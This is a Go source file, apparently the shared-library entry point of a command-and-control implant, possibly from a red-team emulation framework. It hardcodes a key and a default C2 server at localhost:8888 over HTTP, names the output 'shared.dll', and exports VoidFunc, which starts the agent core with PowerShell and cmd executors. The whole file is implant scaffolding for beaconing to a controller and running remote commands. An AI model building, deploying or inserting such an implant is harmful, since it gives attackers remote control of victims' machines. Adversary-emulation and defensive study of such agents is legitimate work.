package main

import "C"
import (
	"../core"
)

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	defaultServer = "http://localhost:8888"
	defaultGroup = "my_group"
	defaultSleep = "60"
	defaultExeName = "shared.dll"
	defaultC2 = "HTTP"
	c2Name = ""
	c2Key = ""
)

//export VoidFunc
func VoidFunc() {
	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key, "defaultC2": defaultC2}
	core.Core(defaultServer, defaultGroup, defaultSleep, 0, defaultExeName, []string{"psh","cmd"}, c2Config, false)
}

func main() {}
